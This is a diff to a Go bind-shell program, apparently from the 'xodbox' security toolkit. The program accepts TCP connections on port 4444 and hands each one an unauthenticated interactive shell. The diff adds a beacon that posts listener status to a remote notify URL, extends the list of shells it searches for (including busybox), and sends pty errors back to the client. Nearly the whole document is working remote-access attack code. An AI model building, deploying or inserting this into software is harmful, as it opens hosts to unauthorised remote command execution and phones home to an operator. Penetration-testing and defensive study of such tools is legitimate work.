@@ -1,12 +1,15 @@
 package main
 
 import (
+	"bytes"
+	"encoding/json"
 	"github.com/creack/pty"
 	"github.com/defektive/xodbox/pkg/util"
 	"github.com/defektive/xodbox/pkg/xlog"
 	"io"
 	"log/slog"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -15,6 +18,8 @@ import (
 	"time"
 	//"time"
 )
+
+var notifyURL = ""
 
 // listener can be overridden at build time. defaults to :4444
 var listener = ":4444"
@@ -56,8 +61,11 @@ func main() {
 
 	if err != nil {
 		lg().Error("Error starting listener", "listener", listener, "err", err)
+		notify("Error starting listener", "listener", listener, "err", err.Error())
+
 	} else {
 		lg().Info("Listening on", "listener", listener)
+		notify("Listening on", "listener", listener)
 	}
 
 	//By removing this loop, you could have the program mimic netcat and end after one connection completes
@@ -82,6 +90,14 @@ func main() {
 	}
 }
 
+// notify sends notification to remote server if specified
+func notify(msg ...string) {
+	if notifyURL != "" {
+		b, _ := json.MarshalIndent(msg, "", "  ")
+		http.Post(notifyURL, "application/json", bytes.NewBuffer(b))
+	}
+}
+
 // receives a reference to a connection, spawns a bash shell over the tcp connection
 func handleConnection(connection net.Conn) {
 	lg().Info("Accepted connection from", "remoteAddr", connection.RemoteAddr().String())
@@ -101,6 +117,8 @@ func handleConnection(connection net.Conn) {
 		ptmx, err := pty.Start(c)
 		if err != nil {
 			lg().Error("Error starting pty", "err", err)
+			connection.Write([]byte("Error starting pty " + err.Error() + "\n")) //convert the string to a byte slice and send it over the connection
+
 			return
 		}
 		// Make sure to close the pty at the end.
@@ -132,12 +150,12 @@ func handleConnection(connection net.Conn) {
 
 func getCommandToExecute() string {
 
-	cmds := []string{"zsh", "bash", "powershell", "cmd"}
+	cmds := []string{"zsh", "bash", "sh", "busybox", "powershell", "cmd"}
 	for _, cmd := range cmds {
 		res, err := exec.LookPath(cmd)
 		if err == nil {
 			return res
 		}
 	}
-	return "sh"
+	return "/bin/sh"
 }
